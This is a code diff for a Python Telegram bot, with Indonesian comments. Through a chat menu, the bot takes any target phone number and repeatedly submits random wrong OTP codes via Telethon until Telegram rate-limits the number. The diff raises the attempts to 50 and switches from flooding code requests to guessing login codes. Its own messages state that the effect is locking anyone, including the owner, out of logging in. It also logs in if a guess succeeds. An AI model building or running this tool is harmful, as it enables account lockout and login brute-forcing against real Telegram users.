@@ -3,6 +3,7 @@ import json
 import logging
 import re
 import time
+import random
 from datetime import datetime, timedelta
 from pathlib import Path
 
@@ -11,7 +12,10 @@ from telethon.errors import (
     FloodWaitError, 
     PhoneNumberFloodError, 
     PhoneNumberInvalidError, 
-    ApiIdInvalidError
+    ApiIdInvalidError,
+    SendCodeUnavailableError,
+    PhoneCodeInvalidError,
+    PhoneCodeExpiredError
 )
 from telethon.sessions import StringSession
 
@@ -26,9 +30,8 @@ logger = logging.getLogger(__name__)
 # State Global
 CONFIG = {}
 ACTIVE_FLOODS = {} # Format: {"+628123456": timestamp_until}
-FLOOD_ATTACK_MAX_ATTEMPTS = 15
-FLOOD_ATTACK_DELAY_SECONDS = 2.0
-
+FLOOD_ATTACK_MAX_ATTEMPTS = 50
+FLOOD_ATTACK_DELAY_SECONDS = 1.5
 PHONE_REGEX = re.compile(r"^\+\d{7,15}$")
 
 def load_config():
@@ -71,36 +74,63 @@ async def trigger_flood_attack(phone: str) -> tuple:
     """Return (seconds, attempts, success, reason)"""
     client = TelegramClient(StringSession(), CONFIG["api_id"], CONFIG["api_hash"])
     attempts = 0
+    phone_code_hash = None
+    
     try:
         await client.connect()
+        
         for _ in range(FLOOD_ATTACK_MAX_ATTEMPTS):
+            # 1. Jika belum punya hash, minta OTP dulu
+            if not phone_code_hash:
+                try:
+                    sent_code = await client.send_code_request(phone)
+                    phone_code_hash = sent_code.phone_code_hash
+                except FloodWaitError as e:
+                    ACTIVE_FLOODS[phone] = time.monotonic() + e.seconds
+                    return e.seconds, attempts, True, "FloodWait terpicu saat meminta kode"
+                except Exception as e:
+                    return 0, attempts, False, f"Gagal meminta kode: {str(e)}"
+
+            # 2. Tebak kode yang salah
+            wrong_code = str(random.randint(10000, 99999))
+            attempts += 1
+            
             try:
-                await client.send_code_request(phone)
-                attempts += 1
+                # Mencoba sign-in dengan kode yang salah
+                await client.sign_in(phone=phone, code=wrong_code, phone_code_hash=phone_code_hash)
+                
+                # Jika berhasil (sangat langka), langsung logout untuk keamanan
+                await client.log_out()
+                return 0, attempts, True, "Berhasil login dengan tebakan (sudah dilogout)"
+                
+            except PhoneCodeInvalidError:
+                # Kode salah, lanjut tembak lagi
+                logger.info(f"Percobaan {attempts}: Kode {wrong_code} salah. Melanjutkan...")
+                
+            except PhoneCodeExpiredError:
+                # Terlalu banyak salah, hash hangus. Kita minta hash baru
+                logger.info("Kode expired. Meminta hash baru...")
+                phone_code_hash = None
+                
             except FloodWaitError as e:
-                # SUKSES: Telegram membalas FLOOD_WAIT_X
+                # SUKSES BESAR! Telegram memblokir login karena terlalu banyak salah
                 ACTIVE_FLOODS[phone] = time.monotonic() + e.seconds
                 return e.seconds, attempts, True, "Berhasil memicu FloodWait"
                 
-            except PhoneNumberFloodError:
-                # SUKSES (Sudah terkunci sebelumnya): Nomor sudah dalam masa FloodWait
-                ACTIVE_FLOODS[phone] = time.monotonic() + 3600 # Default 1 jam
-                return 3600, attempts, True, "Nomor sudah dalam status FloodWait dari Telegram"
-                
-            except PhoneNumberInvalidError:
-                return 0, attempts, False, "Nomor tidak valid atau tidak terdaftar di Telegram."
-                
-            except ApiIdInvalidError:
-                return 0, attempts, False, "API ID / API Hash salah atau diblokir Telegram."
+            except SendCodeUnavailableError:
+                return 0, attempts, False, "Semua metode pengiriman OTP habis."
                 
             except Exception as e:
-                logger.error(f"Error percobaan ke-{attempts}: {e}")
-                return 0, attempts, False, f"Error: {str(e)}"
-            
+                logger.error(f"Error sign-in: {e}")
+                phone_code_hash = None # Reset hash jika ada error aneh
+                
+            # Jeda antar tebakan
             await asyncio.sleep(FLOOD_ATTACK_DELAY_SECONDS)
+            
     finally:
         await client.disconnect()
-    return 0, attempts, False, "Batas maksimal percobaan habis tanpa respon FloodWait."
+        
+    return 0, attempts, False, f"Gagal setelah {attempts}x percobaan."
 
 # ================= UI & MENUS =================
 
@@ -171,11 +201,11 @@ async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     elif data.startswith("confirm_flood_"):
         phone = data.replace("confirm_flood_", "")
-        await query.answer("Memulai proses...")
+        await query.answer("Memulai proses tebak OTP...")
         
         await query.edit_message_text(
             f"🔥 **Memproses {phone}...**\n\n"
-            f"Sedang menembak `send_code_request` ke Telegram. Mohon tunggu...",
+            f"Bot sedang menebak kode OTP secara acak untuk memicu pemblokiran. Mohon tunggu...",
             parse_mode=ParseMode.MARKDOWN
         )
 
@@ -187,9 +217,9 @@ async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 f"✅ **Nomor Berhasil Dikunci**\n\n"
                 f"Nomor: `{phone}`\n"
                 f"Durasi: **{format_duration(seconds)}** (Sampai {until_utc})\n"
-                f"Percobaan: {attempts}x\n"
+                f"Percobaan Salah: {attempts}x\n"
                 f"Status: _{reason}_\n\n"
-                f"🛡️ Tidak ada OTP yang bisa dikirim ke nomor ini selama periode tersebut."
+                f"🛡️ Tidak ada OTP yang bisa digunakan untuk login selama periode tersebut."
             )
         else:
             text = (
@@ -250,8 +280,8 @@ async def handle_phone_input(update: Update, context: ContextTypes.DEFAULT_TYPE)
     await update.message.reply_text(
         f"🔥 **Konfirmasi FloodWait**\n\n"
         f"Target: `{phone}`\n\n"
-        f"Bot akan memanggil `send_code_request` berulang sampai Telegram membalas FloodWait.\n"
-        f"Efek: Siapa pun (termasuk Anda) tidak akan bisa meminta OTP baru selama periode ini.\n\n"
+        f"Bot akan menebak kode OTP yang salah secara berulang sampai Telegram memblokir nomor ini.\n"
+        f"Efek: Siapa pun (termasuk Anda) tidak akan bisa login menggunakan nomor ini untuk sementara waktu.\n\n"
         f"Lanjutkan?",
         parse_mode=ParseMode.MARKDOWN,
         reply_markup=InlineKeyboardMarkup(keyboard)
